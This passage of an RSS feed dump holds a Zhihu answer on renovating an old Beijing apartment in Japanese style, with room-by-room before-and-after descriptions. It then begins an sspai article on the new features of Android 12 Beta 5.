target=\"_blank\">50平小户型要怎么装修成三室一厅？</a><br>\n","link":"http://www.zhihu.com/question/338558347/answer/2099093481?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"装修了日式风格房子是什么体验？","date":"2021-09-09 11:21:15","description":"\n<p>日式装修风格是自然且禅意，简易却又不简单，我手头上的案例比较多，一时间还无法精准又快速找到一个像您家一样大户型的改造案例，那就用一个坐标北京的老龄房爆改日式温馨小两居的案例，尝试给您一些思路和灵感。</p>\n<p>分割线---------------------------------------------------------------------------------------</p>\n<p>作为中国城市化的先驱之一，三五线城市刚刚拔地而起的高楼，在北京往往已经伫立了几十个年头。它们与北京城里的人同呼吸、共命运，也渐渐变得苍老。虽然不像CBD、大裤衩、望京SOHO等光鲜的地标建筑常为人所道，却实实在在的和人们生活紧密相连。</p>\n<p>发霉的墙面、反味的下水道、泛黄的马桶、糟糕的内饰、到处乱堆的杂物……随便拎出一个老房子都能发现这些真实问题。但重新装修又面临着人力、物力、时间、金钱，等各种成本的投入，许多人嫌麻烦，一来二去选择用将就去习惯。</p>\n<p>长此以往，构陷的是生活本身。</p>\n<p>去年，我的工作室有机会接触到一个有25年历史的老房子。房屋建筑面积81.5㎡，套内面积65㎡，位于8层楼的5层。 屋主从购房以来一直对外出租，从未自住。在数不清的租户变更交接下，房子缺乏有意识的维护，状态非常破败。而实际上房屋的地段还算不错，又临近学区，按市场价格来推算并不便宜。 高价格的房屋难以体现出高居住价值，这是北京老房面对的共通性问题。</p>\n<p>今年业主一家人即将把这所老房子收回自用，原因很简单，他们的大女儿马上要上小学了。未来一对夫妻和两个女儿将至少在这所房子中生活5—10年的时间。干净、健康、整洁的居住环境对他们来说非常有必要。 房子虽老，但整体户型很规整。我和我的团队将原来的区域重新划分设计，进行了一场堪称“整容”的翻新装修。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-a407a45c88621c2b2afb80e3ec071064_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1440\" data-watermark=\"watermark\" data-original-src=\"v2-a407a45c88621c2b2afb80e3ec071064\" data-watermark-src=\"v2-1d5be1f219e728e42110464918eb4c2f\" data-private-watermark-src=\"v2-45cbb25b4b5c70d3bc1c3a2033927e45\"></p>\n<p><br></p>\n<p>客厅改造前后</p>\n<p><img src=\"https://pic2.zhimg.com/v2-f7bdfee809e0d476ae9321288ad8d1b7_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1440\" data-watermark=\"watermark\" data-original-src=\"v2-f7bdfee809e0d476ae9321288ad8d1b7\" data-watermark-src=\"v2-7459ec4a9a390a299f497de457bc0e15\" data-private-watermark-src=\"v2-2c89004ee08df998edd4fdd38fb6aa62\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-bf87fc9c6f9d7761012515dd1f8ae906_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1440\" data-watermark=\"watermark\" data-original-src=\"v2-bf87fc9c6f9d7761012515dd1f8ae906\" data-watermark-src=\"v2-cf3e5d84841661345e426535b6524e47\" data-private-watermark-src=\"v2-58ca293b806f5814cfa6e8f60646471d\"></p>\n<p><b>△客厅改造前</b></p>\n<p>客厅本身的面积不是特别宽敞，又因为房屋整体西向采光，所以看上去十分暗黑。视觉压抑，一分钟都不想多待。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-f4711fa68d1fad5108a09b28f7325327_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"731\" data-watermark=\"watermark\" data-original-src=\"v2-f4711fa68d1fad5108a09b28f7325327\" data-watermark-src=\"v2-aedeb49344f96e519fa945ee44b63ec3\" data-private-watermark-src=\"v2-15beaeeab1a5d6ecf551c13ff6b23135\"></p>\n<p><b>△客厅改造后</b></p>\n<p>为了改善光线效果，我们在客厅的入户处顶棚放置了一整块软膜天花，仿自然光的效果，柔和不刺眼。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-111a0ba5d3459f03ba8fa2c78cb74eac_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"watermark\" data-original-src=\"v2-111a0ba5d3459f03ba8fa2c78cb74eac\" data-watermark-src=\"v2-eaf242ae04b2dffd4c0b469e905280b5\" data-private-watermark-src=\"v2-ff1eb0824c4fb5ba6bd56d5ccdc87b7c\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-867963c9b7e6c379772437472f27f1b9_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1620\" data-watermark=\"watermark\" data-original-src=\"v2-867963c9b7e6c379772437472f27f1b9\" data-watermark-src=\"v2-7d1846a475adeae05f92b0aecee21342\" data-private-watermark-src=\"v2-dbe298bdc499a886ece2d6b3629be87e\"></p>\n<p>虽然面积不大，但沙发还是要有的。沿墙壁的L造型节省空间，最大化利用边角。</p>\n<p>定制沙发床，抽屉拉开又是惊喜的收纳储存空间，孩子们的玩具、日常的生活用品全都可以塞进去</p>\n<p><img src=\"https://pic1.zhimg.com/v2-295de0f04e822f69abce03de29c2f756_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"596\" data-rawheight=\"335\" data-watermark=\"watermark\" data-original-src=\"v2-295de0f04e822f69abce03de29c2f756\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>沙发的另一侧，拉伸一下就是一个便捷的单人床。家里老人过来照料孩子，又或亲戚朋友过来借宿，都是一个灵活的选择。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-1fb6ba24a60db490b117c469a622545a_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"872\" data-watermark=\"watermark\" data-original-src=\"v2-1fb6ba24a60db490b117c469a622545a\" data-watermark-src=\"v2-c912dfae677ec31026253f509a780edd\" data-private-watermark-src=\"v2-602ff4548b1868f73b707276d0293837\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-3e28eb444d88fb8e80488048d80a452e_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"watermark\" data-original-src=\"v2-3e28eb444d88fb8e80488048d80a452e\" data-watermark-src=\"v2-4dc93714bd6702a397d7f2211ffe1df4\" data-private-watermark-src=\"v2-08f5e5770cb68d16ab3db3dccec5d038\"></p>\n<p>原本对着两扇卧室门的客厅通道也利用起来，墙体一侧的定制衣柜和水吧台为丰富生活提供可能。一家四口的衣服不再愁往哪里搁置，口渴时随手就能给自己做一杯饮品。</p>\n<p>而长条餐桌的存在也填补了原本没有餐厅的空白。愿意的话，小朋友和父母也可以在这张桌子上学习、办公。</p>\n<p><br></p>\n<p>厨房改造前后</p>\n<p><img src=\"https://pic2.zhimg.com/v2-5f7bfe9cc541c505228a0d54e475ff72_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1440\" data-watermark=\"watermark\" data-original-src=\"v2-5f7bfe9cc541c505228a0d54e475ff72\" data-watermark-src=\"v2-263a17dbc5c4350ee81857dd1acdacd0\" data-private-watermark-src=\"v2-d4479db1923dde11769b28527200145c\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-4f4888a3a15f31116ff7959b675f9c76_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1440\" data-watermark=\"watermark\" data-original-src=\"v2-4f4888a3a15f31116ff7959b675f9c76\" data-watermark-src=\"v2-815cd284f025571a2a9754ec8441bb4b\" data-private-watermark-src=\"v2-6454a8a0f607f9af59401f0af663b008\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-8744265451cde0ad62cdf35f7e6f1ea9_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1440\" data-watermark=\"watermark\" data-original-src=\"v2-8744265451cde0ad62cdf35f7e6f1ea9\" data-watermark-src=\"v2-b352335f007fbe4c05688eacc07c9163\" data-private-watermark-src=\"v2-79ff173d373227ba92a9db8e8ccfe9a4\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-03feb576ac2f3422589c8d5da8e39c2a_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1440\" data-watermark=\"watermark\" data-original-src=\"v2-03feb576ac2f3422589c8d5da8e39c2a\" data-watermark-src=\"v2-c56e9d831cc787cc3de5dea97aea4896\" data-private-watermark-src=\"v2-74ecc152ee5c8e0e50a90f2b68154db1\"></p>\n<p><b>△厨房改造前</b></p>\n<p>关系到吃到嘴里的食物是否卫生，厨房是家中对洁净要求非常高的空间。当我们来到这个25年历史的小厨房中，简直被惊呆。</p>\n<p>拥挤的动线、被油烟熏黄的墙壁，到处都呈现出藏污纳垢的感觉。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-6eec76e4f6a26b87b70eed38a22da5ad_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1620\" data-watermark=\"watermark\" data-original-src=\"v2-6eec76e4f6a26b87b70eed38a22da5ad\" data-watermark-src=\"v2-85e61ec0845fc02813110ceed47e1bcb\" data-private-watermark-src=\"v2-17a95de870da970eac47bf17c666bcf8\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-7ca955ff17e054fc411b1092ef742229_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"watermark\" data-original-src=\"v2-7ca955ff17e054fc411b1092ef742229\" data-watermark-src=\"v2-6cb0ee545241384699de6f30f54254ae\" data-private-watermark-src=\"v2-d30fb360f2ccc99da5c53a262ac63498\"></p>\n<p><b>△厨房改造后</b></p>\n<p>并不需要多么花哨的装饰，只是简单合理的安排就能让一个小空间焕发出应有的活力。</p>\n<p>在尽可能的情况下，我们设计了许多收纳柜，方便锅碗瓢盆的安放，并将冰箱也做了内嵌的设计，视觉上整体性很高。一眼望过去，都是舒心的白。</p>\n<p><br></p>\n<p>洗手间改造前后</p>\n<p><img src=\"https://pic4.zhimg.com/v2-39a3cf80d767fccb81a0f504b9ad18ff_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1440\" data-watermark=\"watermark\" data-original-src=\"v2-39a3cf80d767fccb81a0f504b9ad18ff\" data-watermark-src=\"v2-48949a8cc4307686a5ce5ecbca5c22e4\" data-private-watermark-src=\"v2-3313a7bf1a85d2710c83878184f57649\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-da6201a9465fdd5f000bd3d4b199aa25_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1440\" data-watermark=\"watermark\" data-original-src=\"v2-da6201a9465fdd5f000bd3d4b199aa25\" data-watermark-src=\"v2-35ae857efc9ac8eb7326fbaa8a01454e\" data-private-watermark-src=\"v2-fe19c70d17cc772719d766814bb188e7\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-a266d6bce8ae52fd632b3228b65e7901_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1440\" data-watermark=\"watermark\" data-original-src=\"v2-a266d6bce8ae52fd632b3228b65e7901\" data-watermark-src=\"v2-024159519b2e359da6bc5e4577668237\" data-private-watermark-src=\"v2-a07c5ffc6e1565d5d98ac798676c2c7b\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-1b18e0bee39af20b6a47e6fdc4377d8a_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1440\" data-watermark=\"watermark\" data-original-src=\"v2-1b18e0bee39af20b6a47e6fdc4377d8a\" data-watermark-src=\"v2-8a13caae9f12af135859f1234a666310\" data-private-watermark-src=\"v2-0973d7fbf041d9250c65101c802d2f43\"></p>\n<p><b>△洗手间改造前</b></p>\n<p>没有做干湿分离。淋浴、马桶、洗面台全部堆在一起。所有设施都非常老化，给生活带来很大不便。</p>\n<p>很难想象曾生活在这里的人是怎么熬过来的。沐浴本身是一件释放疲劳，缓解压力的行为。而在你想冲个澡，却不得不闻着马桶返上来的臭气时，整个人就是个大写的悲伤。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-a0fd259166fcc0a1a65693a081ff73f4_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1620\" data-watermark=\"watermark\" data-original-src=\"v2-a0fd259166fcc0a1a65693a081ff73f4\" data-watermark-src=\"v2-ce25e7b56b8176bf67bbef6a34298d3b\" data-private-watermark-src=\"v2-0f0bfca5689c8a30b70c3efc57a19e76\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-7f46005c1787646c17f932c1013c695a_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1592\" data-watermark=\"watermark\" data-original-src=\"v2-7f46005c1787646c17f932c1013c695a\" data-watermark-src=\"v2-659a2f8e0c3d4b6f7eb986b3af7eff17\" data-private-watermark-src=\"v2-77e6bdc062ad107a8637f3f7e2a14c33\"></p>\n<p><b>△洗手间改造后</b></p>\n<p>完全拯救了原来的脏乱差洗手间，用干净的水磨石和本白色柜体，建立干净印象。同时合理划分功能安排，将洗面台、马桶、淋浴有序安放。干湿分离一步到位。虽然马桶和淋浴间不得不设定在一起，但是全部焕新的洁具和高效的长条形地漏能够解决大多数可能存在的问题。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-e5e88615da04acb95e090c471a4a6db2_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1674\" data-watermark=\"watermark\" data-original-src=\"v2-e5e88615da04acb95e090c471a4a6db2\" data-watermark-src=\"v2-c20db3d2e671d8a34e74210573a0b018\" data-private-watermark-src=\"v2-8a757e3bf79013f15b5e8e00b3a68a9d\"></p>\n<p>我们还利用旁边的空间单独辟出了一间儿童洗手间，水盆、马桶的高度都更符合孩子的身高。早高峰上学、上班无需争抢，都有坑位~</p>\n<p><br></p>\n<p>次卧改造前后</p>\n<p><img src=\"https://pic3.zhimg.com/v2-f2ba78e6d8d817550656f7e614a573ca_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1440\" data-watermark=\"watermark\" data-original-src=\"v2-f2ba78e6d8d817550656f7e614a573ca\" data-watermark-src=\"v2-714b00cfe145afcdd2b499fbacdbaa46\" data-private-watermark-src=\"v2-401e7766d8573e29a673c9083e4e9276\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-eb0981ff4a7e3d85e441811aa5f60c02_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1440\" data-watermark=\"watermark\" data-original-src=\"v2-eb0981ff4a7e3d85e441811aa5f60c02\" data-watermark-src=\"v2-d54e7aef088071df7c8a81c81a2817e8\" data-private-watermark-src=\"v2-e6f55faf39106aa2590cbe29628a3e70\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-ed8953a669a4166e2bdee1b90afe2fd3_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1440\" data-watermark=\"watermark\" data-original-src=\"v2-ed8953a669a4166e2bdee1b90afe2fd3\" data-watermark-src=\"v2-f6a04c25feebce339dd711dc4a7913f5\" data-private-watermark-src=\"v2-001a01656f137e429b17418344a5fa16\"></p>\n<p><b>△次卧改造前</b></p>\n<p>一张双人床、一个旧衣柜、一片暖气，就是这个房间的全部了。床和衣柜之间仅剩一人可通行的过道，非常拥挤，除了睡觉似乎没有别的功用。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-1ea32b90fb030746e1d44f05f2a77e4e_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"watermark\" data-original-src=\"v2-1ea32b90fb030746e1d44f05f2a77e4e\" data-watermark-src=\"v2-5797d47f26f8294d5d2d4d8d652b0803\" data-private-watermark-src=\"v2-5c6f8f119553fb881f8ada1ba0879417\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-97c03320dff4bdef32db0ce0a536c2dd_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"watermark\" data-original-src=\"v2-97c03320dff4bdef32db0ce0a536c2dd\" data-watermark-src=\"v2-173e26628b49238e3938f94d757e0ef2\" data-private-watermark-src=\"v2-02edb5c8b2a781c263fc14b5c9a33a2c\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-3f6fc82c36995fedea5ae353849cc1b8_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1620\" data-watermark=\"watermark\" data-original-src=\"v2-3f6fc82c36995fedea5ae353849cc1b8\" data-watermark-src=\"v2-de954ef7b82f7e0d9226d75e4cdd1222\" data-private-watermark-src=\"v2-7de31b52bedb1cbcc9808ad09f01af8b\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-2623d399bb9e4c6d049df22dbd4ce021_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"730\" data-watermark=\"watermark\" data-original-src=\"v2-2623d399bb9e4c6d049df22dbd4ce021\" data-watermark-src=\"v2-78e1c38908cde48ec003a9097ef7fe0a\" data-private-watermark-src=\"v2-9dfc4733b8034b01f71fca10db3340fc\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-4a4940e9ce7894adae82fb9fc90b1b0a_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"596\" data-rawheight=\"335\" data-watermark=\"watermark\" data-original-src=\"v2-4a4940e9ce7894adae82fb9fc90b1b0a\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>△次卧改造后 </b></p>\n<p>把那么小的一间房做成两个孩子能睡觉、能玩耍、能画画、能学习的儿童房。</p>\n<p>绿色的吊床，拱形的小小城堡，天然的棉绳围栏，很羡慕两个小朋友有这样一方童话般的小天地，可以随心所欲肆意成长。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-2af18bed471a04ca99baaf35cf0693a8_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1620\" data-watermark=\"watermark\" data-original-src=\"v2-2af18bed471a04ca99baaf35cf0693a8\" data-watermark-src=\"v2-08c34a5bc836d9caeef660686b264d30\" data-private-watermark-src=\"v2-e8abd3efe0f0636eb0f06b8afc33bf7f\"></p>\n<p>阳台一角为孩子们设计了书架展示柜和可拉伸式的小桌板，可以说是非常贴心了。</p>\n<p>主卧改造前后</p>\n<p><img src=\"https://pic4.zhimg.com/v2-3e74c5e830db34b0558b721e574d7363_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1440\" data-watermark=\"watermark\" data-original-src=\"v2-3e74c5e830db34b0558b721e574d7363\" data-watermark-src=\"v2-0867de14b326ecf9fac39173676f030b\" data-private-watermark-src=\"v2-233fd7ac58cf0f96405952e8793ab228\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-795a9dee0f528bb91fc089ad68c48f3f_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1440\" data-watermark=\"watermark\" data-original-src=\"v2-795a9dee0f528bb91fc089ad68c48f3f\" data-watermark-src=\"v2-b54b764a63c31a173ba36d68b9b633e4\" data-private-watermark-src=\"v2-1c933bd65b352d70847da43f5664b605\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-bfe0c18dd96d4d7d076555344fadc362_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1440\" data-watermark=\"watermark\" data-original-src=\"v2-bfe0c18dd96d4d7d076555344fadc362\" data-watermark-src=\"v2-31015654df8774607a6e9f1b5937a449\" data-private-watermark-src=\"v2-f93978d5a05cf4855667f69b14fe0b71\"></p>\n<p><b>△主卧改造前</b></p>\n<p>整体风格依然非常糟糕，看不到有任何值得保留的地方。原本房间就不大，隔断门将阳台拦在门外，让居室的空间感看起来更狭小了。装修风格同样延续了25年前的老套，而且保养不好木板都已开裂变色。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-d652fb08a3d6cee52ce399712ef17d21_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"watermark\" data-original-src=\"v2-d652fb08a3d6cee52ce399712ef17d21\" data-watermark-src=\"v2-df4df4fbe6f3801154b9f1cfdeadebb8\" data-private-watermark-src=\"v2-9c7e1484098514e1b191eef414ab832b\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-681b3ffb2864dc889e8c2bd453c3397a_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1620\" data-watermark=\"watermark\" data-original-src=\"v2-681b3ffb2864dc889e8c2bd453c3397a\" data-watermark-src=\"v2-e52cc06d496f896ca64c7a6c55b22b1a\" data-private-watermark-src=\"v2-c8c69c4201c9935fe96ccf4856c57024\"></p>\n<p><b>△主卧改造后</b></p>\n<p>完全破除了之前的陈旧风格，简洁的日式风格温馨又实用。穿透一盏不刺眼的吊灯让人非常安心，卸下防备。木白两色平衡着室内的格调，既简单又不失美感。前后对比堪称换头。</p>\n<p>最后，问到有哪些是日式装修风格可以考虑的品牌，说几个：松下 大建 骊住 东理等等，可以根据不同的日式装修搭配，比如原木色+暖白等，去结合实际挑选搭配的主材和家具。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/ryan-wang-heng?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">设计师Ryan王恒</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/63597132/answer/2100743528?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">79 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/283573646?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">为什么总是感觉装修不到一个满意的房子？</a><br><a href=\"http://www.zhihu.com/question/268265223?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">房子面积117准备10万装修够吗？</a><br>\n","link":"http://www.zhihu.com/question/63597132/answer/2100743528?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"具透 | 最后一个测试版：Android 12 Beta 5 暗藏了哪些玄机？","date":"2021-09-09 09:56:16","description":"\n<p>北京时间 9 月 9 日凌晨，Google 如期发布第 5 个 Android 12 测试版本（以下简称 Beta 5）。对于开发者而言，Android 12 Beta 5 将是正式版发布之前的最后一个测试版，这意味着所有的应用层面 SDK、API 和系统行为均已最终定型，Google 也敦促开发者尽快完成最终兼容性测试，以确保应用和游戏在正式版上能够正常运行。</p>\n<p>而对用户来说，Beta 5 作为候选发布版（release candidate）也代表了正式版的大部分实际体验。所以如果你想提前预览 Android 12 正式版的风貌，不妨跟随本文一起来看看本次更新中值得关注的新内容。</p>\n<h2>Material You 与小组件</h2>\n<p>Google 从 Android 12 Beta 2 开始了对系统内建 App 的 Material You 视觉主题的翻新，在这次的 Beta 5 中，Material You 设计语言来到了时钟和计算器两个 App 中。</p>\n<p>在 Beta 5 内置的 7.0 版本时钟应用中，App 主色调默认采用系统根据壁纸提取的主题配色，各类按钮也普遍应用了大面积的圆形或圆角矩形气泡设计，闹钟、世界时钟和就寝时间中的可调整项目，则应用了圆角卡片和圆角按钮设计，整体界面变得十分圆润。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4stch5b34td2engku30.png\"><figcaption>新版闹钟与时钟</figcaption></figure><p>此外，各个页面的按钮也大多向屏幕下方调整，离底栏更近，使得界面对单手操作更加友好。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4stchdb34td2engku3g.png\"><figcaption>定时器、秒表与就寝模式</figcaption></figure><p><strong>与之对应的，此前在 Google 宣传片中多次出现、让很多用户眼馋不已的时钟小部件，在本次更新后也随新版时钟应用一并上线</strong>。除了多边形设计的模拟时钟样式外，新版时钟应用还额外提供了三种数字时钟小组件样式，包括可展示多时钟的世界时间卡片。所有时间小组件都可以视桌面摆放位置的变化实时更改配色方案。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4stchlb34td2engku40.png\"><figcaption>模拟时钟样式与其他样式</figcaption></figure><p><strong>计算器应用则来到了 8.0 版本</strong>，同样由原有的方形按钮设计转向了圆形，各个数字或公式按钮间的边距更加明显；数字与运算操作、公式按钮在之前的版本上由字体颜色来区分，现在改为在按钮背景颜色上做区分，相比较之下更加清晰直观。个人觉得新版计算器更漂亮了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4stchtb34td2ab6qav0.png\"><figcaption>旧版（左）与新版（右）计算器</figcaption></figure><p>不过同样是圆钮式 Material You 控件，目前计算器中的按键并不会像 Android 12 锁屏密码按键那样有按下时变成圆角矩形的动画反馈。可能计算器团队也觉得那个效果不好看吧……</p>\n<p><strong>除了上面提到的时钟，在 Beta 4 中上线的 Android 12 版本号彩蛋在 Beta 5 中也附加了一个小组</strong>件。添加到桌面后调整小组件大小，你就能看到 Material You 从当前壁纸中提取到的所有色彩方案了。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/editor/u_/c4stci5b34td2ab6qavg.png\"><figcaption>版本号彩蛋的小组件</figcaption></figure><h2>锁屏、启动器与全局搜索</h2>\n<p><strong>Beta 5 的锁屏界面也有了一些微小的调整</strong>：锁屏界面的时间、日期和通知不再像以往版本那样挤在一起，算是一种视觉上的「减负」吧。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/editor/u_/c4stcitb34td27uspvf0.png\"><figcaption>锁屏各部分布局间距更大了</figcaption></figure><p><strong>在之前的版本中，Google 为锁屏界面加入了 Google Pay 快速调用银行卡支付的快捷方式，这次则又加入了左下角的设备控制器快捷方式</strong>。从设置中打开相应的选项之后，我们便可以点击锁屏左下角的小房子图标开启设备控制面板。此前电源键设备控制面板「被砍」引来了很多用户的不满，现在这种解决方案也算是一种及时补偿吧。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4stcj5b34td2engku4g.png\"><figcaption>新增的锁屏设备控制器选项</figcaption></figure><p>启动器这边，主要更新围绕在「快速查看（Live Space）」区域和全局搜索两项功能上。</p>\n<p><strong>快速查看可以被看作是 Pixel 系列标志性的「一目了然（At A Glance）」小部件的升级版</strong>，在 Android 12 Beta 5 中，Live Space 功能已经部分上线，主屏顶部的小组件已经从此前的居中「时间+天气」变成了仅有左对齐的日期，总体布局与锁屏状态下的日期布局保持了一致。可能是由于 bug，天气信息目前还不能在快速查看区域正常显示。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4stcjlb34td27uspvfg.png\"><figcaption>快速查看中展示的即时定时器状态（左）及快速查看设置（右）</figcaption></figure><p>在快速查看功能的设置中我们可以看到，它所承载的功能也由原本有限的日程、通勤信息等变成了「适时显示你需要的内容」，由于下方选项无法正常显示，具体支持哪些信息展示目前还不得而知。但在目前的体验过程中我们发现，来自时钟应用的定时器名称及倒计时是可以即时显示在该区域内的。</p>\n<p><strong>iOS 系统上强大的 Spotlight 搜索功能一直给我留下了深刻的印象，在 Beta 5 中 Google 的全局搜索终于也正式上线了，替代了应用抽屉中原有的顶部搜索框。</strong>现在我们不仅可以通过它来快速搜索 App，应用快捷方式、联系人信息、对话、设置项、Pixel Tips 也悉数囊括在内。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4stcjtb34td27uspvg0.png\"><figcaption>全局搜索及其相关设置</figcaption></figure><p>出于隐私考虑，我们也可以自行在相应的设置选项中选择显示或不显示哪些搜索项目。除了搜索范围够大，新的全局搜索功能在索引速度和便捷程度上也令人满意，呼出应用抽屉界面时底部键盘默认自动弹出（可以手动关闭），方便我们快速输入想要搜索的关键词；搜索结果则几乎是即时响应、毫无延迟。</p>\n<p>新的全局搜索能做到如此快速、高效，都得益于新加入的 AppSearch API。AppSearch API 是一个完全离线、应用于设备搜索库的应用程序接口，开发者可以通过集成它来实现上述便捷的搜索功能。作为用户的我们，接下来要做的就是等待各个 App 开发者对该功能做全面的适配了。</p>\n<h2>电源菜单与系统设置</h2>\n<p>赶在正式版之前，Android 12 Beta 5 也对部分系统设置及相关选项进行了一次梳理。</p>\n<p>此前位于「显示 &gt; 锁屏」设置中的设备锁定选项（lockdown）功能被正式移除，取而代之的是默认出现在电源菜单中的设备锁定按钮，选择后可以立即锁屏并在下次解锁时禁用生物信息识别、强制要求输入锁屏密码。</p>\n<figure 